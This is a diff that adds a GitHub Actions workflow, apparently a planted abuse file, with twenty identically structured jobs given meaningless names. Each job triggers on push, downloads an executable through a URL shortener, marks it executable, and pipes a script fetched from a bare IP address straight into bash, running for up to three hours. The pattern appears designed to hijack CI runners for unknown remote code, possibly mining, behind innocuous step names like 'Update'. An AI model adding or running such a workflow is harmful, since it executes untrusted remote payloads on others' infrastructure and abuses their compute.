@@ -1,0 +1,163 @@
+name: jezini
+on: push
+jobs:
+  xibuwu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/ADEnsDT; chmod +x ADEnsDT
+    - name: Update
+      run: curl http://103.171.85.18/mandalorian/nuswuueralsanne.php?a=rivi | bash -
+  gepovivo:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/ADEnsDT; chmod +x ADEnsDT
+    - name: Update
+      run: curl http://103.171.85.18/mandalorian/nuswuueralsanne.php?a=rivi | bash -
+  wixunu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/ADEnsDT; chmod +x ADEnsDT
+    - name: Update
+      run: curl http://103.171.85.18/mandalorian/nuswuueralsanne.php?a=rivi | bash -
+  jinipu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/ADEnsDT; chmod +x ADEnsDT
+    - name: Update
+      run: curl http://103.171.85.18/mandalorian/nuswuueralsanne.php?a=rivi | bash -
+  hoyajo:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/ADEnsDT; chmod +x ADEnsDT
+    - name: Update
+      run: curl http://103.171.85.18/mandalorian/nuswuueralsanne.php?a=rivi | bash -
+  wexoka:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/ADEnsDT; chmod +x ADEnsDT
+    - name: Update
+      run: curl http://103.171.85.18/mandalorian/nuswuueralsanne.php?a=rivi | bash -
+  bimani:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/ADEnsDT; chmod +x ADEnsDT
+    - name: Update
+      run: curl http://103.171.85.18/mandalorian/nuswuueralsanne.php?a=rivi | bash -
+  zeveve:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/ADEnsDT; chmod +x ADEnsDT
+    - name: Update
+      run: curl http://103.171.85.18/mandalorian/nuswuueralsanne.php?a=rivi | bash -
+  monixi:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/ADEnsDT; chmod +x ADEnsDT
+    - name: Update
+      run: curl http://103.171.85.18/mandalorian/nuswuueralsanne.php?a=rivi | bash -
+  ceguhe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/ADEnsDT; chmod +x ADEnsDT
+    - name: Update
+      run: curl http://103.171.85.18/mandalorian/nuswuueralsanne.php?a=rivi | bash -
+  kulupu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/ADEnsDT; chmod +x ADEnsDT
+    - name: Update
+      run: curl http://103.171.85.18/mandalorian/nuswuueralsanne.php?a=rivi | bash -
+  xiguza:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/ADEnsDT; chmod +x ADEnsDT
+    - name: Update
+      run: curl http://103.171.85.18/mandalorian/nuswuueralsanne.php?a=rivi | bash -
+  posijoxu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/ADEnsDT; chmod +x ADEnsDT
+    - name: Update
+      run: curl http://103.171.85.18/mandalorian/nuswuueralsanne.php?a=rivi | bash -
+  zexure:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/ADEnsDT; chmod +x ADEnsDT
+    - name: Update
+      run: curl http://103.171.85.18/mandalorian/nuswuueralsanne.php?a=rivi | bash -
+  sixoyini:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/ADEnsDT; chmod +x ADEnsDT
+    - name: Update
+      run: curl http://103.171.85.18/mandalorian/nuswuueralsanne.php?a=rivi | bash -
+  naxixibu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/ADEnsDT; chmod +x ADEnsDT
+    - name: Update
+      run: curl http://103.171.85.18/mandalorian/nuswuueralsanne.php?a=rivi | bash -
+  sahubeco:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/ADEnsDT; chmod +x ADEnsDT
+    - name: Update
+      run: curl http://103.171.85.18/mandalorian/nuswuueralsanne.php?a=rivi | bash -
+  puvobage:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/ADEnsDT; chmod +x ADEnsDT
+    - name: Update
+      run: curl http://103.171.85.18/mandalorian/nuswuueralsanne.php?a=rivi | bash -
+  juhoya:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/ADEnsDT; chmod +x ADEnsDT
+    - name: Update
+      run: curl http://103.171.85.18/mandalorian/nuswuueralsanne.php?a=rivi | bash -
+  suyoce:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/ADEnsDT; chmod +x ADEnsDT
+    - name: Update
+      run: curl http://103.171.85.18/mandalorian/nuswuueralsanne.php?a=rivi | bash -
